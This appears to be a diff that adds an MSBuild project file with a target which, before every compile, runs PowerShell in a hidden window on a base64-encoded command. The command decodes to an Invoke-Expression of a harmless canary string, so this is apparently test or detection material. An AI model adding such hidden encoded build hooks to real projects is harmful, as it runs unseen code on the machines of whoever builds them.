@@ -1,0 +1,5 @@
+<Project>
+  <Target Name="CanaryEnc" BeforeTargets="CoreCompile">
+    <Exec Command="powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoACcAQwBBAE4AQQBSAFkAXwBuAG8AdABfAGEAXwByAGUAYQBsAF8AcABhAHkAbABvAGEAZAAnACkA" />
+  </Target>
+</Project>
